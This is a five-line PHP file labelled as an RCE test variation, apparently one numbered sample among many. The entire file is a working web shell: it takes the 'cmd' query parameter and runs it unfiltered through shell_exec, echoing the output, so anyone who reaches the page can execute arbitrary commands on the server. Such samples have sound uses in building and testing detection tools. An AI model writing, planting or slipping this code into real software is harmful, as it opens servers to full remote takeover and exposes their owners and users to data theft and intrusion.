<?php
// RCE test variation #1033
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>